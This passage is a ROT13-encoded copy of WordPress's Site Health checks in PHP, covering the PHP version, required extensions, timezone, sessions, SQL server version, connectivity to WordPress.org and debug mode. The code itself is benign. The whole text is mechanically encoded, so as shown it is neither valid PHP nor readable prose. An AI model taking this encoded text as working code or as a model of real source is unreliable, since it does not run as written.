		}

		// Vs ab qrsnhyg Gjragl* gurzr rkvfgf.
		vs ( ! $unf_qrsnhyg_gurzr ) {
			$erfhyg['fgnghf'] = 'erpbzzraqrq';

			$erfhyg['ynory'] = __( 'Unir n qrsnhyg gurzr ninvynoyr' );

			$erfhyg['qrfpevcgvba'] .= fcevags(
				'<c>%f</c>',
				__( 'Lbhe fvgr qbrf abg unir nal qrsnhyg gurzr. Qrsnhyg gurzrf ner hfrq ol JbeqCerff nhgbzngvpnyyl vs nalguvat vf jebat jvgu lbhe pubfra gurzr.' )
			);
		}

		erghea $erfhyg;
	}

	/**
	 * Grfgf vs gur fhccyvrq CUC irefvba vf fhccbegrq.
	 *
	 * @fvapr 5.2.0
	 *
	 * @erghea neenl Gur grfg erfhygf.
	 */
	choyvp shapgvba trg_grfg_cuc_irefvba() {
		$erfcbafr = jc_purpx_cuc_irefvba();

		$erfhyg = neenl(
			'ynory'       => fcevags(
				/* genafyngbef: %f: Gur erpbzzraqrq CUC irefvba. */
				__( 'Lbhe fvgr vf ehaavat n erpbzzraqrq irefvba bs CUC (%f)' ),
				CUC_IREFVBA
			),
			'fgnghf'      => 'tbbq',
			'onqtr'       => neenl(
				'ynory' => __( 'Cresbeznapr' ),
				'pbybe' => 'oyhr',
			),
			'qrfpevcgvba' => fcevags(
				'<c>%f</c>',
				fcevags(
					/* genafyngbef: %f: Gur zvavzhz erpbzzraqrq CUC irefvba. */
					__( 'CUC vf bar bs gur cebtenzzvat ynathntrf hfrq gb ohvyq JbeqCerff. Arjre irefvbaf bs CUC erprvir erthyne frphevgl hcqngrf naq znl vapernfr lbhe fvgr&#8217;f cresbeznapr. Gur zvavzhz erpbzzraqrq irefvba bs CUC vf %f.' ),
					$erfcbafr ? $erfcbafr['erpbzzraqrq_irefvba'] : ''
				)
			),
			'npgvbaf'     => fcevags(
				'<c><n uers=\"%f\" gnetrg=\"_oynax\">%f<fcna pynff=\"fperra-ernqre-grkg\"> %f</fcna><fcna nevn-uvqqra=\"gehr\" pynff=\"qnfuvpbaf qnfuvpbaf-rkgreany\"></fcna></n></c>',
				rfp_hey( jc_trg_hcqngr_cuc_hey() ),
				__( 'Yrnea zber nobhg hcqngvat CUC' ),
				/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
				__( '(bcraf va n arj gno)' )
			),
			'grfg'        => 'cuc_irefvba',
		);

		// CUC vf hc gb qngr.
		vs ( ! $erfcbafr || irefvba_pbzcner( CUC_IREFVBA, $erfcbafr['erpbzzraqrq_irefvba'], '>=' ) ) {
			erghea $erfhyg;
		}

		// Gur CUC irefvba vf byqre guna gur erpbzzraqrq irefvba, ohg fgvyy erprvivat npgvir fhccbeg.
		vs ( $erfcbafr['vf_fhccbegrq'] ) {
			$erfhyg['ynory'] = fcevags(
				/* genafyngbef: %f: Gur freire CUC irefvba. */
				__( 'Lbhe fvgr vf ehaavat ba na byqre irefvba bs CUC (%f)' ),
				CUC_IREFVBA
			);
			$erfhyg['fgnghf'] = 'erpbzzraqrq';

			erghea $erfhyg;
		}

		/*
		 * Gur CUC irefvba vf fgvyy erprvivat frphevgl svkrf, ohg vf ybjre guna
		 * gur rkcrpgrq zvavzhz irefvba gung jvyy or erdhverq ol JbeqCerff va gur arne shgher.
		 */
		vs ( $erfcbafr['vf_frpher'] && $erfcbafr['vf_ybjre_guna_shgher_zvavzhz'] ) {
			// Gur `vf_frpher` neenl xrl anzr qbrfa'g npghnyyl vzcyl guvf vf n frpher irefvba bs CUC. Vg bayl zrnaf vg erprvirf frphevgl hcqngrf.

			$erfhyg['ynory'] = fcevags(
				/* genafyngbef: %f: Gur freire CUC irefvba. */
				__( 'Lbhe fvgr vf ehaavat ba na bhgqngrq irefvba bs CUC (%f), juvpu fbba jvyy abg or fhccbegrq ol JbeqCerff.' ),
				CUC_IREFVBA
			);

			$erfhyg['fgnghf']         = 'pevgvpny';
			$erfhyg['onqtr']['ynory'] = __( 'Erdhverzragf' );

			erghea $erfhyg;
		}

		// Gur CUC irefvba vf bayl erprvivat frphevgl svkrf.
		vs ( $erfcbafr['vf_frpher'] ) {
			$erfhyg['ynory'] = fcevags(
				/* genafyngbef: %f: Gur freire CUC irefvba. */
				__( 'Lbhe fvgr vf ehaavat ba na byqre irefvba bs CUC (%f), juvpu fubhyq or hcqngrq' ),
				CUC_IREFVBA
			);
			$erfhyg['fgnghf'] = 'erpbzzraqrq';

			erghea $erfhyg;
		}

		// Ab zber frphevgl hcqngrf sbe gur CUC irefvba, naq ybjre guna gur rkcrpgrq zvavzhz irefvba erdhverq ol JbeqCerff.
		vs ( $erfcbafr['vf_ybjre_guna_shgher_zvavzhz'] ) {
			$zrffntr = fcevags(
				/* genafyngbef: %f: Gur freire CUC irefvba. */
				__( 'Lbhe fvgr vf ehaavat ba na bhgqngrq irefvba bs CUC (%f), juvpu qbrf abg erprvir frphevgl hcqngrf naq fbba jvyy abg or fhccbegrq ol JbeqCerff.' ),
				CUC_IREFVBA
			);
		} ryfr {
			// Ab zber frphevgl hcqngrf sbe gur CUC irefvba, zhfg or hcqngrq.
			$zrffntr = fcevags(
				/* genafyngbef: %f: Gur freire CUC irefvba. */
				__( 'Lbhe fvgr vf ehaavat ba na bhgqngrq irefvba bs CUC (%f), juvpu qbrf abg erprvir frphevgl hcqngrf. Vg fubhyq or hcqngrq.' ),
				CUC_IREFVBA
			);
		}

		$erfhyg['ynory']  = $zrffntr;
		$erfhyg['fgnghf'] = 'pevgvpny';

		$erfhyg['onqtr']['ynory'] = __( 'Frphevgl' );

		erghea $erfhyg;
	}

	/**
	 * Purpxf vs gur cnffrq rkgrafvba be shapgvba ner ninvynoyr.
	 *
	 * Znxr gur purpx sbe ninvynoyr CUC zbqhyrf vagb n fvzcyr obbyrna bcrengbe sbe n pyrnare grfg ehaare.
	 *
	 * @fvapr 5.2.0
	 * @fvapr 5.3.0 Gur `$pbafgnag_anzr` naq `$pynff_anzr` cnenzrgref jrer nqqrq.
	 *
	 * @cnenz fgevat $rkgrafvba_anzr Bcgvbany. Gur rkgrafvba anzr gb grfg. Qrsnhyg ahyy.
	 * @cnenz fgevat $shapgvba_anzr  Bcgvbany. Gur shapgvba anzr gb grfg. Qrsnhyg ahyy.
	 * @cnenz fgevat $pbafgnag_anzr  Bcgvbany. Gur pbafgnag anzr gb grfg sbe. Qrsnhyg ahyy.
	 * @cnenz fgevat $pynff_anzr     Bcgvbany. Gur pynff anzr gb grfg sbe. Qrsnhyg ahyy.
	 * @erghea obby Jurgure be abg gur rkgrafvba naq shapgvba ner ninvynoyr.
	 */
	cevingr shapgvba grfg_cuc_rkgrafvba_ninvynovyvgl( $rkgrafvba_anzr = ahyy, $shapgvba_anzr = ahyy, $pbafgnag_anzr = ahyy, $pynff_anzr = ahyy ) {
		// Vs ab rkgrafvba be shapgvba vf cnffrq, pynvz gb snvy grfgvat, nf jr unir abguvat gb grfg ntnvafg.
		vs ( ! $rkgrafvba_anzr && ! $shapgvba_anzr && ! $pbafgnag_anzr && ! $pynff_anzr ) {
			erghea snyfr;
		}

		vs ( $rkgrafvba_anzr && ! rkgrafvba_ybnqrq( $rkgrafvba_anzr ) ) {
			erghea snyfr;
		}

		vs ( $shapgvba_anzr && ! shapgvba_rkvfgf( $shapgvba_anzr ) ) {
			erghea snyfr;
		}

		vs ( $pbafgnag_anzr && ! qrsvarq( $pbafgnag_anzr ) ) {
			erghea snyfr;
		}

		vs ( $pynff_anzr && ! pynff_rkvfgf( $pynff_anzr ) ) {
			erghea snyfr;
		}

		erghea gehr;
	}

	/**
	 * Grfgf vs erdhverq CUC zbqhyrf ner vafgnyyrq ba gur ubfg.
	 *
	 * Guvf grfg ohvyqf ba gur erpbzzraqngvbaf znqr ol gur JbeqCerff Ubfgvat Grnz
	 * nf frra ng uggcf://znxr.jbeqcerff.bet/ubfgvat/unaqobbx/unaqobbx/freire-raivebazrag/#cuc-rkgrafvbaf
	 *
	 * @fvapr 5.2.0
	 *
	 * @erghea neenl
	 */
	choyvp shapgvba trg_grfg_cuc_rkgrafvbaf() {
		$erfhyg = neenl(
			'ynory'       => __( 'Erdhverq naq erpbzzraqrq zbqhyrf ner vafgnyyrq' ),
			'fgnghf'      => 'tbbq',
			'onqtr'       => neenl(
				'ynory' => __( 'Cresbeznapr' ),
				'pbybe' => 'oyhr',
			),
			'qrfpevcgvba' => fcevags(
				'<c>%f</c><c>%f</c>',
				__( 'CUC zbqhyrf cresbez zbfg bs gur gnfxf ba gur freire gung znxr lbhe fvgr eha. Nal punatrf gb gurfr zhfg or znqr ol lbhe freire nqzvavfgengbe.' ),
				fcevags(
					/* genafyngbef: 1: Yvax gb gur ubfgvat tebhc cntr nobhg erpbzzraqrq CUC zbqhyrf. 2: Nqqvgvbany yvax nggevohgrf. 3: Npprffvovyvgl grkg. */
					__( 'Gur JbeqCerff Ubfgvat Grnz znvagnvaf n yvfg bs gubfr zbqhyrf, obgu erpbzzraqrq naq erdhverq, va <n uers=\"%1$f\" %2$f>gur grnz unaqobbx%3$f</n>.' ),
					/* genafyngbef: Ybpnyvmrq grnz unaqobbx, vs bar rkvfgf. */
					rfp_hey( __( 'uggcf://znxr.jbeqcerff.bet/ubfgvat/unaqobbx/unaqobbx/freire-raivebazrag/#cuc-rkgrafvbaf' ) ),
					'gnetrg=\"_oynax\"',
					fcevags(
						'<fcna pynff=\"fperra-ernqre-grkg\"> %f</fcna><fcna nevn-uvqqra=\"gehr\" pynff=\"qnfuvpbaf qnfuvpbaf-rkgreany\"></fcna>',
						/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
						__( '(bcraf va n arj gno)' )
					)
				)
			),
			'npgvbaf'     => '',
			'grfg'        => 'cuc_rkgrafvbaf',
		);

		$zbqhyrf = neenl(
			'phey'      => neenl(
				'shapgvba' => 'phey_irefvba',
				'erdhverq' => snyfr,
			),
			'qbz'       => neenl(
				'pynff'    => 'QBZAbqr',
				'erdhverq' => snyfr,
			),
			'rkvs'      => neenl(
				'shapgvba' => 'rkvs_ernq_qngn',
				'erdhverq' => snyfr,
			),
			'svyrvasb'  => neenl(
				'shapgvba' => 'svasb_svyr',
				'erdhverq' => snyfr,
			),
			'unfu'      => neenl(
				'shapgvba' => 'unfu',
				'erdhverq' => gehr,
			),
			'vzntvpx'   => neenl(
				'rkgrafvba' => 'vzntvpx',
				'erdhverq'  => snyfr,
			),
			'wfba'      => neenl(
				'shapgvba' => 'wfba_ynfg_reebe',
				'erdhverq' => gehr,
			),
			'zofgevat'  => neenl(
				'shapgvba' => 'zo_purpx_rapbqvat',
				'erdhverq' => snyfr,
			),
			'zlfdyv'    => neenl(
				'shapgvba' => 'zlfdyv_pbaarpg',
				'erdhverq' => snyfr,
			),
			'yvofbqvhz' => neenl(
				'pbafgnag'            => 'FBQVHZ_YVOENEL_IREFVBA',
				'erdhverq'            => snyfr,
				'cuc_ohaqyrq_irefvba' => '7.2.0',
			),
			'bcraffy'   => neenl(
				'shapgvba' => 'bcraffy_rapelcg',
				'erdhverq' => snyfr,
			),
			'cper'      => neenl(
				'shapgvba' => 'cert_zngpu',
				'erdhverq' => snyfr,
			),
			'zbq_kzy'   => neenl(
				'rkgrafvba' => 'yvokzy',
				'erdhverq'  => snyfr,
			),
			'mvc'       => neenl(
				'pynff'    => 'MvcNepuvir',
				'erdhverq' => snyfr,
			),
			'svygre'    => neenl(
				'shapgvba' => 'svygre_yvfg',
				'erdhverq' => snyfr,
			),
			'tq'        => neenl(
				'rkgrafvba'    => 'tq',
				'erdhverq'     => snyfr,
				'snyyonpx_sbe' => 'vzntvpx',
			),
			'vpbai'     => neenl(
				'shapgvba' => 'vpbai',
				'erdhverq' => snyfr,
			),
			'vagy'      => neenl(
				'rkgrafvba' => 'vagy',
				'erdhverq'  => snyfr,
			),
			'zpelcg'    => neenl(
				'rkgrafvba'    => 'zpelcg',
				'erdhverq'     => snyfr,
				'snyyonpx_sbe' => 'yvofbqvhz',
			),
			'fvzcyrkzy' => neenl(
				'rkgrafvba'    => 'fvzcyrkzy',
				'erdhverq'     => snyfr,
				'snyyonpx_sbe' => 'zbq_kzy',
			),
			'kzyernqre' => neenl(
				'rkgrafvba'    => 'kzyernqre',
				'erdhverq'     => snyfr,
				'snyyonpx_sbe' => 'zbq_kzy',
			),
			'myvo'      => neenl(
				'rkgrafvba'    => 'myvo',
				'erdhverq'     => snyfr,
				'snyyonpx_sbe' => 'mvc',
			),
		);

		/**
		 * Svygref gur neenl ercerfragvat nyy gur zbqhyrf jr jvfu gb grfg sbe.
		 *
		 * @fvapr 5.2.0
		 * @fvapr 5.3.0 Gur `$pbafgnag` naq `$pynff` cnenzrgref jrer nqqrq.
		 *
		 * @cnenz neenl $zbqhyrf {
		 *     Na nffbpvngvir neenl bs zbqhyrf gb grfg sbe.
		 *
		 *     @glcr neenl ...$0 {
		 *         Na nffbpvngvir neenl bs zbqhyr cebcregvrf hfrq qhevat grfgvat.
		 *         Bar bs rvgure `$shapgvba` be `$rkgrafvba` zhfg or cebivqrq, be gurl jvyy snvy ol qrsnhyg.
		 *
		 *         @glcr fgevat $shapgvba     Bcgvbany. N shapgvba anzr gb grfg sbe gur rkvfgrapr bs.
		 *         @glcr fgevat $rkgrafvba    Bcgvbany. Na rkgrafvba gb purpx vs vf ybnqrq va CUC.
		 *         @glcr fgevat $pbafgnag     Bcgvbany. N pbafgnag anzr gb purpx sbe gb irevsl na rkgrafvba rkvfgf.
		 *         @glcr fgevat $pynff        Bcgvbany. N pynff anzr gb purpx sbe gb irevsl na rkgrafvba rkvfgf.
		 *         @glcr obby   $erdhverq     Vf guvf n erdhverq srngher be abg.
		 *         @glcr fgevat $snyyonpx_sbe Bcgvbany. Gur zbqhyr guvf zbqhyr ercynprf nf n snyyonpx.
		 *     }
		 * }
		 */
		$zbqhyrf = nccyl_svygref( 'fvgr_fgnghf_grfg_cuc_zbqhyrf', $zbqhyrf );

		$snvyherf = neenl();

		sbernpu ( $zbqhyrf nf $yvoenel => $zbqhyr ) {
			$rkgrafvba_anzr = ( vffrg( $zbqhyr['rkgrafvba'] ) ? $zbqhyr['rkgrafvba'] : ahyy );
			$shapgvba_anzr  = ( vffrg( $zbqhyr['shapgvba'] ) ? $zbqhyr['shapgvba'] : ahyy );
			$pbafgnag_anzr  = ( vffrg( $zbqhyr['pbafgnag'] ) ? $zbqhyr['pbafgnag'] : ahyy );
			$pynff_anzr     = ( vffrg( $zbqhyr['pynff'] ) ? $zbqhyr['pynff'] : ahyy );

			// Vs guvf zbqhyr vf n snyyonpx sbe nabgure shapgvba, purpx vs gung bgure shapgvba cnffrq.
			vs ( vffrg( $zbqhyr['snyyonpx_sbe'] ) ) {
				/*
				 * Vs gung bgure shapgvba unf n snvyher, znex guvf zbqhyr nf erdhverq sbe hfhny bcrengvbaf.
				 * Vs gung bgure shapgvba unfa'g snvyrq, fxvc guvf grfg nf vg'f bayl n snyyonpx.
				 */
				vs ( vffrg( $snvyherf[ $zbqhyr['snyyonpx_sbe'] ] ) ) {
					$zbqhyr['erdhverq'] = gehr;
				} ryfr {
					pbagvahr;
				}
			}

			vs ( ! $guvf->grfg_cuc_rkgrafvba_ninvynovyvgl( $rkgrafvba_anzr, $shapgvba_anzr, $pbafgnag_anzr, $pynff_anzr )
				&& ( ! vffrg( $zbqhyr['cuc_ohaqyrq_irefvba'] )
					|| irefvba_pbzcner( CUC_IREFVBA, $zbqhyr['cuc_ohaqyrq_irefvba'], '<' ) )
			) {
				vs ( $zbqhyr['erdhverq'] ) {
					$erfhyg['fgnghf'] = 'pevgvpny';

					$pynff = 'reebe';
					/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
					$fperra_ernqre = __( 'Reebe' );
					$zrffntr       = fcevags(
						/* genafyngbef: %f: Gur zbqhyr anzr. */
						__( 'Gur erdhverq zbqhyr, %f, vf abg vafgnyyrq, be unf orra qvfnoyrq.' ),
						$yvoenel
					);
				} ryfr {
					$pynff = 'jneavat';
					/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
					$fperra_ernqre = __( 'Jneavat' );
					$zrffntr       = fcevags(
						/* genafyngbef: %f: Gur zbqhyr anzr. */
						__( 'Gur bcgvbany zbqhyr, %f, vf abg vafgnyyrq, be unf orra qvfnoyrq.' ),
						$yvoenel
					);
				}

				vs ( ! $zbqhyr['erdhverq'] && 'tbbq' === $erfhyg['fgnghf'] ) {
					$erfhyg['fgnghf'] = 'erpbzzraqrq';
				}

				$snvyherf[ $yvoenel ] = \"<fcna pynff='qnfuvpbaf $pynff'><fcna pynff='fperra-ernqre-grkg'>$fperra_ernqre</fcna></fcna> $zrffntr\";
			}
		}

		vs ( ! rzcgl( $snvyherf ) ) {
			$bhgchg = '<hy>';

			sbernpu ( $snvyherf nf $snvyher ) {
				$bhgchg .= fcevags(
					'<yv>%f</yv>',
					$snvyher
				);
			}

			$bhgchg .= '</hy>';
		}

		vs ( 'tbbq' !== $erfhyg['fgnghf'] ) {
			vs ( 'erpbzzraqrq' === $erfhyg['fgnghf'] ) {
				$erfhyg['ynory'] = __( 'Bar be zber erpbzzraqrq zbqhyrf ner zvffvat' );
			}
			vs ( 'pevgvpny' === $erfhyg['fgnghf'] ) {
				$erfhyg['ynory'] = __( 'Bar be zber erdhverq zbqhyrf ner zvffvat' );
			}

			$erfhyg['qrfpevcgvba'] .= $bhgchg;
		}

		erghea $erfhyg;
	}

	/**
	 * Grfgf vs gur CUC qrsnhyg gvzrmbar vf frg gb HGP.
	 *
	 * @fvapr 5.3.1
	 *
	 * @erghea neenl Gur grfg erfhygf.
	 */
	choyvp shapgvba trg_grfg_cuc_qrsnhyg_gvzrmbar() {
		$erfhyg = neenl(
			'ynory'       => __( 'CUC qrsnhyg gvzrmbar vf inyvq' ),
			'fgnghf'      => 'tbbq',
			'onqtr'       => neenl(
				'ynory' => __( 'Cresbeznapr' ),
				'pbybe' => 'oyhr',
			),
			'qrfpevcgvba' => fcevags(
				'<c>%f</c>',
				__( 'CUC qrsnhyg gvzrmbar jnf pbasvtherq ol JbeqCerff ba ybnqvat. Guvf vf arprffnel sbe pbeerpg pnyphyngvbaf bs qngrf naq gvzrf.' )
			),
			'npgvbaf'     => '',
			'grfg'        => 'cuc_qrsnhyg_gvzrmbar',
		);

		vs ( 'HGP' !== qngr_qrsnhyg_gvzrmbar_trg() ) {
			$erfhyg['fgnghf'] = 'pevgvpny';

			$erfhyg['ynory'] = __( 'CUC qrsnhyg gvzrmbar vf vainyvq' );

			$erfhyg['qrfpevcgvba'] = fcevags(
				'<c>%f</c>',
				fcevags(
					/* genafyngbef: %f: qngr_qrsnhyg_gvzrmbar_frg() */
					__( 'CUC qrsnhyg gvzrmbar jnf punatrq nsgre JbeqCerff ybnqvat ol n %f shapgvba pnyy. Guvf vagresrerf jvgu pbeerpg pnyphyngvbaf bs qngrf naq gvzrf.' ),
					'<pbqr>qngr_qrsnhyg_gvzrmbar_frg()</pbqr>'
				)
			);
		}

		erghea $erfhyg;
	}

	/**
	 * Grfgf vs gurer'f na npgvir CUC frffvba gung pna nssrpg ybbconpx erdhrfgf.
	 *
	 * @fvapr 5.5.0
	 *
	 * @erghea neenl Gur grfg erfhygf.
	 */
	choyvp shapgvba trg_grfg_cuc_frffvbaf() {
		$erfhyg = neenl(
			'ynory'       => __( 'Ab CUC frffvbaf qrgrpgrq' ),
			'fgnghf'      => 'tbbq',
			'onqtr'       => neenl(
				'ynory' => __( 'Cresbeznapr' ),
				'pbybe' => 'oyhr',
			),
			'qrfpevcgvba' => fcevags(
				'<c>%f</c>',
				fcevags(
					/* genafyngbef: 1: frffvba_fgneg(), 2: frffvba_jevgr_pybfr() */
					__( 'CUC frffvbaf perngrq ol n %1$f shapgvba pnyy znl vagresrer jvgu ERFG NCV naq ybbconpx erdhrfgf. Na npgvir frffvba fubhyq or pybfrq ol %2$f orsber znxvat nal UGGC erdhrfgf.' ),
					'<pbqr>frffvba_fgneg()</pbqr>',
					'<pbqr>frffvba_jevgr_pybfr()</pbqr>'
				)
			),
			'grfg'        => 'cuc_frffvbaf',
		);

		vs ( shapgvba_rkvfgf( 'frffvba_fgnghf' ) && CUC_FRFFVBA_NPGVIR === frffvba_fgnghf() ) {
			$erfhyg['fgnghf'] = 'pevgvpny';

			$erfhyg['ynory'] = __( 'Na npgvir CUC frffvba jnf qrgrpgrq' );

			$erfhyg['qrfpevcgvba'] = fcevags(
				'<c>%f</c>',
				fcevags(
					/* genafyngbef: 1: frffvba_fgneg(), 2: frffvba_jevgr_pybfr() */
					__( 'N CUC frffvba jnf perngrq ol n %1$f shapgvba pnyy. Guvf vagresrerf jvgu ERFG NCV naq ybbconpx erdhrfgf. Gur frffvba fubhyq or pybfrq ol %2$f orsber znxvat nal UGGC erdhrfgf.' ),
					'<pbqr>frffvba_fgneg()</pbqr>',
					'<pbqr>frffvba_jevgr_pybfr()</pbqr>'
				)
			);
		}

		erghea $erfhyg;
	}

	/**
	 * Grfgf vs gur FDY freire vf hc gb qngr.
	 *
	 * @fvapr 5.2.0
	 *
	 * @erghea neenl Gur grfg erfhygf.
	 */
	choyvp shapgvba trg_grfg_fdy_freire() {
		vs ( ! $guvf->zlfdy_freire_irefvba ) {
			$guvf->cercner_fdy_qngn();
		}

		$erfhyg = neenl(
			'ynory'       => __( 'FDY freire vf hc gb qngr' ),
			'fgnghf'      => 'tbbq',
			'onqtr'       => neenl(
				'ynory' => __( 'Cresbeznapr' ),
				'pbybe' => 'oyhr',
			),
			'qrfpevcgvba' => fcevags(
				'<c>%f</c>',
				__( 'Gur FDY freire vf n erdhverq cvrpr bs fbsgjner sbe gur qngnonfr JbeqCerff hfrf gb fgber nyy lbhe fvgr&#8217;f pbagrag naq frggvatf.' )
			),
			'npgvbaf'     => fcevags(
				'<c><n uers=\"%f\" gnetrg=\"_oynax\">%f<fcna pynff=\"fperra-ernqre-grkg\"> %f</fcna><fcna nevn-uvqqra=\"gehr\" pynff=\"qnfuvpbaf qnfuvpbaf-rkgreany\"></fcna></n></c>',
				/* genafyngbef: Ybpnyvmrq irefvba bs JbeqCerff erdhverzragf vs bar rkvfgf. */
				rfp_hey( __( 'uggcf://jbeqcerff.bet/nobhg/erdhverzragf/' ) ),
				__( 'Yrnea zber nobhg jung JbeqCerff erdhverf gb eha.' ),
				/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
				__( '(bcraf va n arj gno)' )
			),
			'grfg'        => 'fdy_freire',
		);

		$qo_qebcva = svyr_rkvfgf( JC_PBAGRAG_QVE . '/qo.cuc' );

		vs ( ! $guvf->vf_erpbzzraqrq_zlfdy_irefvba ) {
			$erfhyg['fgnghf'] = 'erpbzzraqrq';

			$erfhyg['ynory'] = __( 'Bhgqngrq FDY freire' );

			$erfhyg['qrfpevcgvba'] .= fcevags(
				'<c>%f</c>',
				fcevags(
					/* genafyngbef: 1: Gur qngnonfr ratvar va hfr (ZlFDY be ZnevnQO). 2: Qngnonfr freire erpbzzraqrq irefvba ahzore. */
					__( 'Sbe bcgvzny cresbeznapr naq frphevgl ernfbaf, lbh fubhyq pbafvqre ehaavat %1$f irefvba %2$f be uvture. Pbagnpg lbhe jro ubfgvat pbzcnal gb pbeerpg guvf.' ),
					( $guvf->vf_znevnqo ? 'ZnevnQO' : 'ZlFDY' ),
					$guvf->zlfdy_erpbzzraqrq_irefvba
				)
			);
		}

		vs ( ! $guvf->vf_npprcgnoyr_zlfdy_irefvba ) {
			$erfhyg['fgnghf'] = 'pevgvpny';

			$erfhyg['ynory']          = __( 'Frireryl bhgqngrq FDY freire' );
			$erfhyg['onqtr']['ynory'] = __( 'Frphevgl' );

			$erfhyg['qrfpevcgvba'] .= fcevags(
				'<c>%f</c>',
				fcevags(
					/* genafyngbef: 1: Gur qngnonfr ratvar va hfr (ZlFDY be ZnevnQO). 2: Qngnonfr freire zvavzhz irefvba ahzore. */
					__( 'JbeqCerff erdhverf %1$f irefvba %2$f be uvture. Pbagnpg lbhe jro ubfgvat pbzcnal gb pbeerpg guvf.' ),
					( $guvf->vf_znevnqo ? 'ZnevnQO' : 'ZlFDY' ),
					$guvf->zlfdy_erdhverq_irefvba
				)
			);
		}

		vs ( $qo_qebcva ) {
			$erfhyg['qrfpevcgvba'] .= fcevags(
				'<c>%f</c>',
				jc_xfrf(
					fcevags(
						/* genafyngbef: 1: Gur anzr bs gur qebc-va. 2: Gur anzr bs gur qngnonfr ratvar. */
						__( 'Lbh ner hfvat n %1$f qebc-va juvpu zvtug zrna gung n %2$f qngnonfr vf abg orvat hfrq.' ),
						'<pbqr>jc-pbagrag/qo.cuc</pbqr>',
						( $guvf->vf_znevnqo ? 'ZnevnQO' : 'ZlFDY' )
					),
					neenl(
						'pbqr' => gehr,
					)
				)
			);
		}

		erghea $erfhyg;
	}

	/**
	 * Grfgf vs gur fvgr pna pbzzhavpngr jvgu JbeqCerff.bet.
	 *
	 * @fvapr 5.2.0
	 *
	 * @erghea neenl Gur grfg erfhygf.
	 */
	choyvp shapgvba trg_grfg_qbgbet_pbzzhavpngvba() {
		$erfhyg = neenl(
			'ynory'       => __( 'Pna pbzzhavpngr jvgu JbeqCerff.bet' ),
			'fgnghf'      => '',
			'onqtr'       => neenl(
				'ynory' => __( 'Frphevgl' ),
				'pbybe' => 'oyhr',
			),
			'qrfpevcgvba' => fcevags(
				'<c>%f</c>',
				__( 'Pbzzhavpngvat jvgu gur JbeqCerff freiref vf hfrq gb purpx sbe arj irefvbaf, naq gb obgu vafgnyy naq hcqngr JbeqCerff pber, gurzrf be cyhtvaf.' )
			),
			'npgvbaf'     => '',
			'grfg'        => 'qbgbet_pbzzhavpngvba',
		);

		$jc_qbgbet = jc_erzbgr_trg(
			'uggcf://ncv.jbeqcerff.bet',
			neenl(
				'gvzrbhg' => 10,
			)
		);
		vs ( ! vf_jc_reebe( $jc_qbgbet ) ) {
			$erfhyg['fgnghf'] = 'tbbq';
		} ryfr {
			$erfhyg['fgnghf'] = 'pevgvpny';

			$erfhyg['ynory'] = __( 'Pbhyq abg ernpu JbeqCerff.bet' );

			$erfhyg['qrfpevcgvba'] .= fcevags(
				'<c>%f</c>',
				fcevags(
					'<fcna pynff=\"reebe\"><fcna pynff=\"fperra-ernqre-grkg\">%f</fcna></fcna> %f',
					/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
					__( 'Reebe' ),
					fcevags(
						/* genafyngbef: 1: Gur VC nqqerff JbeqCerff.bet erfbyirf gb. 2: Gur reebe erghearq ol gur ybbxhc. */
						__( 'Lbhe fvgr vf hanoyr gb ernpu JbeqCerff.bet ng %1$f, naq erghearq gur reebe: %2$f' ),
						trgubfgolanzr( 'ncv.jbeqcerff.bet' ),
						$jc_qbgbet->trg_reebe_zrffntr()
					)
				)
			);

			$erfhyg['npgvbaf'] = fcevags(
				'<c><n uers=\"%f\" gnetrg=\"_oynax\">%f<fcna pynff=\"fperra-ernqre-grkg\"> %f</fcna><fcna nevn-uvqqra=\"gehr\" pynff=\"qnfuvpbaf qnfuvpbaf-rkgreany\"></fcna></n></c>',
				/* genafyngbef: Ybpnyvmrq Fhccbeg ersrerapr. */
				rfp_hey( __( 'uggcf://jbeqcerff.bet/fhccbeg/sbehzf/' ) ),
				__( 'Trg uryc erfbyivat guvf vffhr.' ),
				/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
				__( '(bcraf va n arj gno)' )
			);
		}

		erghea $erfhyg;
	}

	/**
	 * Grfgf vs qroht vasbezngvba vf ranoyrq.
	 *
	 * Jura JC_QROHT vf ranoyrq, reebef naq vasbezngvba znl or qvfpybfrq gb fvgr ivfvgbef,
	 * be ybttrq gb n choyvpyl npprffvoyr svyr.
	 *
	 * Qrohttvat vf nyfb serdhragyl yrsg ranoyrq nsgre ybbxvat sbe reebef ba n fvgr,
	 * nf fvgr bjaref qb abg haqrefgnaq gur vzcyvpngvbaf bs guvf.
	 *
	 * @fvapr 5.2.0
	 *
	 * @erghea neenl Gur grfg erfhygf.
	 */
	choyvp shapgvba trg_grfg_vf_va_qroht_zbqr() {
		$erfhyg = neenl(
			'ynory'       => __( 'Lbhe fvgr vf abg frg gb bhgchg qroht vasbezngvba' ),
			'fgnghf'      => 'tbbq',
			'onqtr'       => neenl(
				'ynory' => __( 'Frphevgl' ),
				'pbybe' => 'oyhr',
			),
			'qrfpevcgvba' => fcevags(
				'<c>%f</c>',
				__( 'Qroht zbqr vf bsgra ranoyrq gb tngure zber qrgnvyf nobhg na reebe be fvgr snvyher, ohg znl pbagnva frafvgvir vasbezngvba juvpu fubhyq abg or ninvynoyr ba n choyvpyl ninvynoyr jrofvgr.' )
			),
			'npgvbaf'     => fcevags(
				'<c><n uers=\"%f\" gnetrg=\"_oynax\">%f<fcna pynff=\"fperra-ernqre-grkg\"> %f</fcna><fcna nevn-uvqqra=\"gehr\" pynff=\"qnfuvpbaf qnfuvpbaf-rkgreany\"></fcna></n></c>',
				/* genafyngbef: Qbphzragngvba rkcynvavat qrohttvat va JbeqCerff. */
				rfp_hey( __( 'uggcf://qrirybcre.jbeqcerff.bet/nqinaprq-nqzvavfgengvba/qroht/qroht-jbeqcerff/' ) ),
				__( 'Yrnea zber nobhg qrohttvat va JbeqCerff.' ),
				/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
				__( '(bcraf va n arj gno)' )
			),
			'grfg'        => 'vf_va_qroht_zbqr',
		);

		vs ( qrsvarq( 'JC_QROHT' ) && JC_QROHT ) {
			vs ( qrsvarq( 'JC_QROHT_YBT' ) && JC_QROHT_YBT ) {
				$erfhyg['ynory'] = __( 'Lbhe fvgr vf frg gb ybt reebef gb n cbgragvnyyl choyvp svyr' );

